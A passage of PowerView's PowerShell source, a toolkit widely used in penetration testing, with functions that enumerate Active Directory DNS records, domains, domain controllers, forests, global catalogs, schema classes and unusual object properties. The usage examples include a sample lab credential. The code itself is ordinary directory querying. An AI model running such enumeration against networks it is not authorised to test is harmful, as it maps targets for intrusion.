$Results | Where-Object {$_} | ForEach-Object {\n                $Out = Convert-LDAPProperty -Properties $_.Properties\n                $Out | Add-Member NoteProperty 'ZoneName' $Out.name\n                $Out.PSObject.TypeNames.Insert(0, 'PowerView.DNSZone')\n                $Out\n            }\n\n            if ($Results) {\n                try { $Results.dispose() }\n                catch {\n                    Write-Verbose \"[Get-DomainDFSShare] Error disposing of the Results object: $_\"\n                }\n            }\n            $DNSSearcher1.dispose()\n        }\n\n        $SearcherArguments['SearchBasePrefix'] = 'CN=MicrosoftDNS,DC=DomainDnsZones'\n        $DNSSearcher2 = Get-DomainSearcher @SearcherArguments\n\n        if ($DNSSearcher2) {\n            try {\n                if ($PSBoundParameters['FindOne']) { $Results = $DNSSearcher2.FindOne() }\n                else { $Results = $DNSSearcher2.FindAll() }\n                $Results | Where-Object {$_} | ForEach-Object {\n                    $Out = Convert-LDAPProperty -Properties $_.Properties\n                    $Out | Add-Member NoteProperty 'ZoneName' $Out.name\n                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.DNSZone')\n                    $Out\n                }\n                if ($Results) {\n                    try { $Results.dispose() }\n                    catch {\n                        Write-Verbose \"[Get-DomainDNSZone] Error disposing of the Results object: $_\"\n                    }\n                }\n            }\n            catch {\n                Write-Verbose \"[Get-DomainDNSZone] Error accessing 'CN=MicrosoftDNS,DC=DomainDnsZones'\"\n            }\n            $DNSSearcher2.dispose()\n        }\n    }\n}\n\n\nfunction Get-DomainDNSRecord {\n<#\n.SYNOPSIS\n\nEnumerates the Active Directory DNS records for a given zone.\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: Get-DomainSearcher, Convert-LDAPProperty, Convert-DNSRecord  \n\n.DESCRIPTION\n\nGiven a specific Active Directory DNS zone name, query for all 'dnsNode'\nLDAP entries using that zone as the search base. Return all DNS entry results\nand use Convert-DNSRecord to try to convert the binary DNS record blobs.\n\n.PARAMETER ZoneName\n\nSpecifies the zone to query for records (which can be enumearted with Get-DomainDNSZone).\n\n.PARAMETER Domain\n\nThe domain to query for zones, defaults to the current domain.\n\n.PARAMETER Server\n\nSpecifies an Active Directory server (domain controller) to bind to for the search.\n\n.PARAMETER Properties\n\nSpecifies the properties of the output object to retrieve from the server.\n\n.PARAMETER ResultPageSize\n\nSpecifies the PageSize to set for the LDAP searcher object.\n\n.PARAMETER ServerTimeLimit\n\nSpecifies the maximum amount of time the server spends searching. Default of 120 seconds.\n\n.PARAMETER FindOne\n\nOnly return one result object.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connection to the target domain.\n\n.EXAMPLE\n\nGet-DomainDNSRecord -ZoneName testlab.local\n\nRetrieve all records for the testlab.local zone.\n\n.EXAMPLE\n\nGet-DomainDNSZone | Get-DomainDNSRecord\n\nRetrieve all records for all zones in the current domain.\n\n.EXAMPLE\n\nGet-DomainDNSZone -Domain dev.testlab.local | Get-DomainDNSRecord -Domain dev.testlab.local\n\nRetrieve all records for all zones in the dev.testlab.local domain.\n\n.OUTPUTS\n\nPowerView.DNSRecord\n\nOutputs custom PSObjects with detailed information about the DNS record entry.\n#>\n\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]\n    [OutputType('PowerView.DNSRecord')]\n    [CmdletBinding()]\n    Param(\n        [Parameter(Position = 0,  Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $ZoneName,\n\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $Domain,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('DomainController')]\n        [String]\n        $Server,\n\n        [ValidateNotNullOrEmpty()]\n        [String[]]\n        $Properties = 'name,distinguishedname,dnsrecord,whencreated,whenchanged',\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ResultPageSize = 200,\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ServerTimeLimit,\n\n        [Alias('ReturnOne')]\n        [Switch]\n        $FindOne,\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty\n    )\n\n    PROCESS {\n        $SearcherArguments = @{\n            'LDAPFilter' = '(objectClass=dnsNode)'\n            'SearchBasePrefix' = \"DC=$($ZoneName),CN=MicrosoftDNS,DC=DomainDnsZones\"\n        }\n        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }\n        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }\n        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }\n        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }\n        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }\n        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }\n        $DNSSearcher = Get-DomainSearcher @SearcherArguments\n\n        if ($DNSSearcher) {\n            if ($PSBoundParameters['FindOne']) { $Results = $DNSSearcher.FindOne() }\n            else { $Results = $DNSSearcher.FindAll() }\n            $Results | Where-Object {$_} | ForEach-Object {\n                try {\n                    $Out = Convert-LDAPProperty -Properties $_.Properties | Select-Object name,distinguishedname,dnsrecord,whencreated,whenchanged\n                    $Out | Add-Member NoteProperty 'ZoneName' $ZoneName\n\n                    # convert the record and extract the properties\n                    if ($Out.dnsrecord -is [System.DirectoryServices.ResultPropertyValueCollection]) {\n                        # TODO: handle multiple nested records properly?\n                        $Record = Convert-DNSRecord -DNSRecord $Out.dnsrecord[0]\n                    }\n                    else {\n                        $Record = Convert-DNSRecord -DNSRecord $Out.dnsrecord\n                    }\n\n                    if ($Record) {\n                        $Record.PSObject.Properties | ForEach-Object {\n                            $Out | Add-Member NoteProperty $_.Name $_.Value\n                        }\n                    }\n\n                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.DNSRecord')\n                    $Out\n                }\n                catch {\n                    Write-Warning \"[Get-DomainDNSRecord] Error: $_\"\n                    $Out\n                }\n            }\n\n            if ($Results) {\n                try { $Results.dispose() }\n                catch {\n                    Write-Verbose \"[Get-DomainDNSRecord] Error disposing of the Results object: $_\"\n                }\n            }\n            $DNSSearcher.dispose()\n        }\n    }\n}\n\n\nfunction Get-Domain {\n<#\n.SYNOPSIS\n\nReturns the domain object for the current (or specified) domain.\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: None  \n\n.DESCRIPTION\n\nReturns a System.DirectoryServices.ActiveDirectory.Domain object for the current\ndomain or the domain specified with -Domain X.\n\n.PARAMETER Domain\n\nSpecifies the domain name to query for, defaults to the current domain.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connection to the target domain.\n\n.EXAMPLE\n\nGet-Domain -Domain testlab.local\n\n.EXAMPLE\n\n$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)\nGet-Domain -Credential $Cred\n\n.OUTPUTS\n\nSystem.DirectoryServices.ActiveDirectory.Domain\n\nA complex .NET domain object.\n\n.LINK\n\nhttp://social.technet.microsoft.com/Forums/scriptcenter/en-US/0c5b3f83-e528-4d49-92a4-dee31f4b481c/finding-the-dn-of-the-the-domain-without-admodule-in-powershell?forum=ITCG\n#>\n\n    [OutputType([System.DirectoryServices.ActiveDirectory.Domain])]\n    [CmdletBinding()]\n    Param(\n        [Parameter(Position = 0, ValueFromPipeline = $True)]\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $Domain,\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty\n    )\n\n    PROCESS {\n        if ($PSBoundParameters['Credential']) {\n\n            Write-Verbose '[Get-Domain] Using alternate credentials for Get-Domain'\n\n            if ($PSBoundParameters['Domain']) {\n                $TargetDomain = $Domain\n            }\n            else {\n                # if no domain is supplied, extract the logon domain from the PSCredential passed\n                $TargetDomain = $Credential.GetNetworkCredential().Domain\n                Write-Verbose \"[Get-Domain] Extracted domain '$TargetDomain' from -Credential\"\n            }\n\n            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $TargetDomain, $Credential.UserName, $Credential.GetNetworkCredential().Password)\n\n            try {\n                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)\n            }\n            catch {\n                Write-Verbose \"[Get-Domain] The specified domain '$TargetDomain' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid: $_\"\n            }\n        }\n        elseif ($PSBoundParameters['Domain']) {\n            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $Domain)\n            try {\n                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)\n            }\n            catch {\n                Write-Verbose \"[Get-Domain] The specified domain '$Domain' does not exist, could not be contacted, or there isn't an existing trust : $_\"\n            }\n        }\n        else {\n            try {\n                [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()\n            }\n            catch {\n                Write-Verbose \"[Get-Domain] Error retrieving the current domain: $_\"\n            }\n        }\n    }\n}\n\n\nfunction Get-DomainController {\n<#\n.SYNOPSIS\n\nReturn the domain controllers for the current (or specified) domain.\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: Get-DomainComputer, Get-Domain  \n\n.DESCRIPTION\n\nEnumerates the domain controllers for the current or specified domain.\nBy default built in .NET methods are used. The -LDAP switch uses Get-DomainComputer\nto search for domain controllers.\n\n.PARAMETER Domain\n\nThe domain to query for domain controllers, defaults to the current domain.\n\n.PARAMETER Server\n\nSpecifies an Active Directory server (domain controller) to bind to.\n\n.PARAMETER LDAP\n\nSwitch. Use LDAP queries to determine the domain controllers instead of built in .NET methods.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connection to the target domain.\n\n.EXAMPLE\n\nGet-DomainController -Domain 'test.local'\n\nDetermine the domain controllers for 'test.local'.\n\n.EXAMPLE\n\nGet-DomainController -Domain 'test.local' -LDAP\n\nDetermine the domain controllers for 'test.local' using LDAP queries.\n\n.EXAMPLE\n\n'test.local' | Get-DomainController\n\nDetermine the domain controllers for 'test.local'.\n\n.EXAMPLE\n\n$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)\nGet-DomainController -Credential $Cred\n\n.OUTPUTS\n\nPowerView.Computer\n\nOutputs custom PSObjects with details about the enumerated domain controller if -LDAP is specified.\n\nSystem.DirectoryServices.ActiveDirectory.DomainController\n\nIf -LDAP isn't specified.\n#>\n\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]\n    [OutputType('PowerView.Computer')]\n    [OutputType('System.DirectoryServices.ActiveDirectory.DomainController')]\n    [CmdletBinding()]\n    Param(\n        [Parameter(Position = 0, ValueFromPipeline = $True)]\n        [String]\n        $Domain,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('DomainController')]\n        [String]\n        $Server,\n\n        [Switch]\n        $LDAP,\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty\n    )\n\n    PROCESS {\n        $Arguments = @{}\n        if ($PSBoundParameters['Domain']) { $Arguments['Domain'] = $Domain }\n        if ($PSBoundParameters['Credential']) { $Arguments['Credential'] = $Credential }\n\n        if ($PSBoundParameters['LDAP'] -or $PSBoundParameters['Server']) {\n            if ($PSBoundParameters['Server']) { $Arguments['Server'] = $Server }\n\n            # UAC specification for domain controllers\n            $Arguments['LDAPFilter'] = '(userAccountControl:1.2.840.113556.1.4.803:=8192)'\n\n            Get-DomainComputer @Arguments\n        }\n        else {\n            $FoundDomain = Get-Domain @Arguments\n            if ($FoundDomain) {\n                $FoundDomain.DomainControllers\n            }\n        }\n    }\n}\n\n\nfunction Get-Forest {\n<#\n.SYNOPSIS\n\nReturns the forest object for the current (or specified) forest.\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: ConvertTo-SID  \n\n.DESCRIPTION\n\nReturns a System.DirectoryServices.ActiveDirectory.Forest object for the current\nforest or the forest specified with -Forest X.\n\n.PARAMETER Forest\n\nThe forest name to query for, defaults to the current forest.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connection to the target forest.\n\n.EXAMPLE\n\nGet-Forest -Forest external.domain\n\n.EXAMPLE\n\n$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)\nGet-Forest -Credential $Cred\n\n.OUTPUTS\n\nSystem.Management.Automation.PSCustomObject\n\nOutputs a PSObject containing System.DirectoryServices.ActiveDirectory.Forest in addition\nto the forest root domain SID.\n#>\n\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]\n    [OutputType('System.Management.Automation.PSCustomObject')]\n    [CmdletBinding()]\n    Param(\n        [Parameter(Position = 0, ValueFromPipeline = $True)]\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $Forest,\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty\n    )\n\n    PROCESS {\n        if ($PSBoundParameters['Credential']) {\n\n            Write-Verbose \"[Get-Forest] Using alternate credentials for Get-Forest\"\n\n            if ($PSBoundParameters['Forest']) {\n                $TargetForest = $Forest\n            }\n            else {\n                # if no domain is supplied, extract the logon domain from the PSCredential passed\n                $TargetForest = $Credential.GetNetworkCredential().Domain\n                Write-Verbose \"[Get-Forest] Extracted domain '$Forest' from -Credential\"\n            }\n\n            $ForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $TargetForest, $Credential.UserName, $Credential.GetNetworkCredential().Password)\n\n            try {\n                $ForestObject = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($ForestContext)\n            }\n            catch {\n                Write-Verbose \"[Get-Forest] The specified forest '$TargetForest' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid: $_\"\n                $Null\n            }\n        }\n        elseif ($PSBoundParameters['Forest']) {\n            $ForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $Forest)\n            try {\n                $ForestObject = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($ForestContext)\n            }\n            catch {\n                Write-Verbose \"[Get-Forest] The specified forest '$Forest' does not exist, could not be contacted, or there isn't an existing trust: $_\"\n                return $Null\n            }\n        }\n        else {\n            # otherwise use the current forest\n            $ForestObject = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()\n        }\n\n        if ($ForestObject) {\n            # get the SID of the forest root\n            if ($PSBoundParameters['Credential']) {\n                $ForestSid = (Get-DomainUser -Identity \"krbtgt\" -Domain $ForestObject.RootDomain.Name -Credential $Credential).objectsid\n            }\n            else {\n                $ForestSid = (Get-DomainUser -Identity \"krbtgt\" -Domain $ForestObject.RootDomain.Name).objectsid\n            }\n\n            $Parts = $ForestSid -Split '-'\n            $ForestSid = $Parts[0..$($Parts.length-2)] -join '-'\n            $ForestObject | Add-Member NoteProperty 'RootDomainSid' $ForestSid\n            $ForestObject\n        }\n    }\n}\n\n\nfunction Get-ForestDomain {\n<#\n.SYNOPSIS\n\nReturn all domains for the current (or specified) forest.\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: Get-Forest  \n\n.DESCRIPTION\n\nReturns all domains for the current forest or the forest specified\nby -Forest X.\n\n.PARAMETER Forest\n\nSpecifies the forest name to query for domains.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connection to the target forest.\n\n.EXAMPLE\n\nGet-ForestDomain\n\n.EXAMPLE\n\nGet-ForestDomain -Forest external.local\n\n.EXAMPLE\n\n$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)\nGet-ForestDomain -Credential $Cred\n\n.OUTPUTS\n\nSystem.DirectoryServices.ActiveDirectory.Domain\n#>\n\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]\n    [OutputType('System.DirectoryServices.ActiveDirectory.Domain')]\n    [CmdletBinding()]\n    Param(\n        [Parameter(Position = 0, ValueFromPipeline = $True)]\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $Forest,\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty\n    )\n\n    PROCESS {\n        $Arguments = @{}\n        if ($PSBoundParameters['Forest']) { $Arguments['Forest'] = $Forest }\n        if ($PSBoundParameters['Credential']) { $Arguments['Credential'] = $Credential }\n\n        $ForestObject = Get-Forest @Arguments\n        if ($ForestObject) {\n            $ForestObject.Domains\n        }\n    }\n}\n\n\nfunction Get-ForestGlobalCatalog {\n<#\n.SYNOPSIS\n\nReturn all global catalogs for the current (or specified) forest.\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: Get-Forest  \n\n.DESCRIPTION\n\nReturns all global catalogs for the current forest or the forest specified\nby -Forest X by using Get-Forest to retrieve the specified forest object\nand the .FindAllGlobalCatalogs() to enumerate the global catalogs.\n\n.PARAMETER Forest\n\nSpecifies the forest name to query for global catalogs.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connection to the target domain.\n\n.EXAMPLE\n\nGet-ForestGlobalCatalog\n\n.EXAMPLE\n\n$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)\nGet-ForestGlobalCatalog -Credential $Cred\n\n.OUTPUTS\n\nSystem.DirectoryServices.ActiveDirectory.GlobalCatalog\n#>\n\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]\n    [OutputType('System.DirectoryServices.ActiveDirectory.GlobalCatalog')]\n    [CmdletBinding()]\n    Param(\n        [Parameter(Position = 0, ValueFromPipeline = $True)]\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $Forest,\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty\n    )\n\n    PROCESS {\n        $Arguments = @{}\n        if ($PSBoundParameters['Forest']) { $Arguments['Forest'] = $Forest }\n        if ($PSBoundParameters['Credential']) { $Arguments['Credential'] = $Credential }\n\n        $ForestObject = Get-Forest @Arguments\n\n        if ($ForestObject) {\n            $ForestObject.FindAllGlobalCatalogs()\n        }\n    }\n}\n\n\nfunction Get-ForestSchemaClass {\n<#\n.SYNOPSIS\n\nHelper that returns the Active Directory schema classes for the current\n(or specified) forest or returns just the schema class specified by\n-ClassName X.\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: Get-Forest  \n\n.DESCRIPTION\n\nUses Get-Forest to retrieve the current (or specified) forest. By default,\nthe .FindAllClasses() method is executed, returning a collection of\n[DirectoryServices.ActiveDirectory.ActiveDirectorySchemaClass] results.\nIf \"-FindClass X\" is specified, the [DirectoryServices.ActiveDirectory.ActiveDirectorySchemaClass]\nresult for the specified class name is returned.\n\n.PARAMETER ClassName\n\nSpecifies a ActiveDirectorySchemaClass name in the found schema to return.\n\n.PARAMETER Forest\n\nThe forest to query for the schema, defaults to the current forest.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connection to the target domain.\n\n.EXAMPLE\n\nGet-ForestSchemaClass\n\nReturns all domain schema classes for the current forest.\n\n.EXAMPLE\n\nGet-ForestSchemaClass -Forest dev.testlab.local\n\nReturns all domain schema classes for the external.local forest.\n\n.EXAMPLE\n\nGet-ForestSchemaClass -ClassName user -Forest external.local\n\nReturns the user schema class for the external.local domain.\n\n.EXAMPLE\n\n$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)\nGet-ForestSchemaClass -ClassName user -Forest external.local -Credential $Cred\n\nReturns the user schema class for the external.local domain using\nthe specified alternate credentials.\n\n.OUTPUTS\n\n[DirectoryServices.ActiveDirectory.ActiveDirectorySchemaClass]\n\nAn ActiveDirectorySchemaClass returned from the found schema.\n#>\n\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]\n    [OutputType([System.DirectoryServices.ActiveDirectory.ActiveDirectorySchemaClass])]\n    [CmdletBinding()]\n    Param(\n        [Parameter(Position = 0, ValueFromPipeline = $True)]\n        [Alias('Class')]\n        [ValidateNotNullOrEmpty()]\n        [String[]]\n        $ClassName,\n\n        [Alias('Name')]\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $Forest,\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty\n    )\n\n    PROCESS {\n        $Arguments = @{}\n        if ($PSBoundParameters['Forest']) { $Arguments['Forest'] = $Forest }\n        if ($PSBoundParameters['Credential']) { $Arguments['Credential'] = $Credential }\n\n        $ForestObject = Get-Forest @Arguments\n\n        if ($ForestObject) {\n            if ($PSBoundParameters['ClassName']) {\n                ForEach ($TargetClass in $ClassName) {\n                    $ForestObject.Schema.FindClass($TargetClass)\n                }\n            }\n            else {\n                $ForestObject.Schema.FindAllClasses()\n            }\n        }\n    }\n}\n\n\nfunction Find-DomainObjectPropertyOutlier {\n<#\n.SYNOPSIS\n\nFinds user/group/computer objects in AD that have 'outlier' properties set.\n\nAuthor: Will Schroeder (@harmj0y), Matthew Graeber (@mattifestation)  \nLicense: BSD 3-Clause  \nRequired Dependencies: Get-Domain, Get-DomainUser, Get-DomainGroup, Get-DomainComputer\n\n.DESCRIPTION\n\nA 'reference' set of property names is calculated, either from a standard set preserved\nfor user/group/computers, or from the array of names passed to -ReferencePropertySet, or\nfrom the property names of the passed -ReferenceObject. Every user/group/computer object\n(depending on determined class) are enumerated, and for each object, if the object has a\n'non-standard' property set (meaning a property not held by the reference set), the object's\nsamAccountName, property name, and property value are output to the pipeline.\n\n.PARAMETER ClassName\n\nSpecifies the AD object class to find property outliers for, 'user', 'group', or 'computer'.\nIf -ReferenceObject is specified, this will be automatically extracted, if possible.\n\n.PARAMETER ReferencePropertySet\n\nSpecifies an array of property names to diff against the class schema.\n\n.PARAMETER ReferenceObject\n\nSpecicifes the PowerView user/group/computer object to extract property names\nfrom to use as the reference set.\n\n.PARAMETER Domain\n\nSpecifies the domain to use for the query, defaults to the current domain.\n\n.PARAMETER LDAPFilter\n\nSpecifies an LDAP query string that is used to filter Active Directory objects.\n\n.PARAMETER SearchBase\n\nThe LDAP source to search through, e.g. \"LDAP://OU=secret,DC=testlab,DC=local\"\nUseful for OU queries.\n\n.PARAMETER Server\n\nSpecifies an Active Directory server (domain controller) to bind to.\n\n.PARAMETER SearchScope\n\nSpecifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).\n\n.PARAMETER ResultPageSize\n\nSpecifies the PageSize to set for the LDAP searcher object.\n\n.PARAMETER ServerTimeLimit\n\nSpecifies the maximum amount of time the server spends searching. Default of 120 seconds.\n\n.PARAMETER Tombstone\n\nSwitch. Specifies that the searcher should also return deleted/tombstoned objects.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connection to the target domain.\n\n.EXAMPLE\n\nFind-DomainObjectPropertyOutlier -ClassName 'User'\n\nEnumerates users in the current domain with 'outlier' properties filled in.\n\n.EXAMPLE\n\nFind-DomainObjectPropertyOutlier -ClassName 'Group' -Domain external.local\n\nEnumerates groups in the external.local forest/domain with 'outlier' properties filled in.\n\n.EXAMPLE\n\nGet-DomainComputer -FindOne | Find-DomainObjectPropertyOutlier\n\nEnumerates computers in the current domain with 'outlier' properties filled in.\n\n.OUTPUTS\n\nPowerView.PropertyOutlier\n\nCustom PSObject with translated object property outliers.\n#>\n\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]\n    [OutputType('PowerView.PropertyOutlier')]\n    [CmdletBinding(DefaultParameterSetName = 'ClassName')]\n    Param(\n        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 'ClassName')]\n        [Alias('Class')]\n        [ValidateSet('User', 'Group', 'Computer')]\n        [String]\n        $ClassName,\n\n        [ValidateNotNullOrEmpty()]\n        [String[]]\n        $ReferencePropertySet,\n\n        [Parameter(ValueFromPipeline = $True, Mandatory = $True, ParameterSetName = 'ReferenceObject')]\n        [PSCustomObject]\n        $ReferenceObject,\n\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $Domain,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('Filter')]\n        [String]\n        $LDAPFilter,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('ADSPath')]\n        [String]\n        $SearchBase,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('DomainController')]\n        [String]\n        $Server,\n\n        [ValidateSet('Base', 'OneLevel', 'Subtree')]\n        [String]\n        $SearchScope = 'Subtree',\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ResultPageSize = 200,\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ServerTimeLimit,\n\n        [Switch]\n        $Tombstone,\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty\n    )\n\n    BEGIN {\n        $UserReferencePropertySet = @('admincount','accountexpires','badpasswordtime','badpwdcount','cn','codepage','countrycode','description', 'displayname','distinguishedname','dscorepropagationdata','givenname','instancetype','iscriticalsystemobject','lastlogoff','lastlogon','lastlogontimestamp','lockouttime','logoncount','memberof','msds-supportedencryptiontypes','name','objectcategory','objectclass','objectguid','objectsid','primarygroupid','pwdlastset','samaccountname','samaccounttype','sn','useraccountcontrol','userprincipalname','usnchanged','usncreated','whenchanged','whencreated')\n\n        $GroupReferencePropertySet = @('admincount','cn','description','distinguishedname','dscorepropagationdata','grouptype','instancetype','iscriticalsystemobject','member','memberof','name','objectcategory','objectclass','objectguid','objectsid','samaccountname','samaccounttype','systemflags','usnchanged','usncreated','whenchanged','whencreated')\n\n        $ComputerReferencePropertySet = @('accountexpires','badpasswordtime','badpwdcount','cn','codepage','countrycode','distinguishedname','dnshostname','dscorepropagationdata','instancetype','iscriticalsystemobject','lastlogoff','lastlogon','lastlogontimestamp','localpolicyflags','logoncount','msds-supportedencryptiontypes','name','objectcategory','objectclass','objectguid','objectsid','operatingsystem','operatingsystemservicepack','operatingsystemversion','primarygroupid','pwdlastset','samaccountname','samaccounttype','serviceprincipalname','useraccountcontrol','usnchanged','usncreated','whenchanged','whencreated')\n\n        $SearcherArguments = @{}\n        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }\n        if ($PSBoundParameters['LDAPFilter']) { $SearcherArguments['LDAPFilter'] = $LDAPFilter }\n        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }\n        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }\n        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }\n        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }\n        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }\n        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }\n        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }\n\n        # Domain / Credential\n        if ($PSBoundParameters['Domain']) {\n            if ($PSBoundParameters['Credential']) {\n                $TargetForest = Get-Domain -Domain $Domain | Select-Object -ExpandProperty Forest | Select-Object -ExpandProperty Name\n            }\n            else {\n                $TargetForest = Get-Domain -Domain $Domain -Credential $Credential | Select-Object -ExpandProperty Forest | Select-Object -ExpandProperty Name\n            }\n            Write-Verbose \"[Find-DomainObjectPropertyOutlier] Enumerated forest '$TargetForest' for target domain '$Domain'\"\n        }\n\n        $SchemaArguments = @{}\n        if ($PSBoundParameters['Credential']) { $SchemaArguments['Credential'] = $Credential }\n        if ($TargetForest) {\n            $SchemaArguments['Forest'] = $TargetForest\n        }\n    }\n\n    PROCESS {\n\n        if ($PSBoundParameters['ReferencePropertySet']) {\n            Write-Verbose \"[Find-DomainObjectPropertyOutlier] Using specified -ReferencePropertySet\"\n            $ReferenceObjectProperties = $ReferencePropertySet\n        }\n        elseif ($PSBoundParameters['ReferenceObject']) {\n            Write-Verbose \"[Find-DomainObjectPropertyOutlier] Extracting property names from -ReferenceObject to use as the reference property set\"\n            $ReferenceObjectProperties = Get-Member -InputObject $ReferenceObject -MemberType NoteProperty | Select-Object -Expand Name\n            $ReferenceObjectClass = $ReferenceObject.objectclass | Select-Object -Last 1\n            Write-Verbose \"[Find-DomainObjectPropertyOutlier] Calculated ReferenceObjectClass : $ReferenceObjectClass\"\n        }\n        else {\n            Write-Verbose \"[Find-DomainObjectPropertyOutlier] Using the default reference property set for the object class '$ClassName'\"\n        }\n\n        if (($ClassName -eq 'User') -or ($ReferenceObjectClass -eq 'User')) {\n            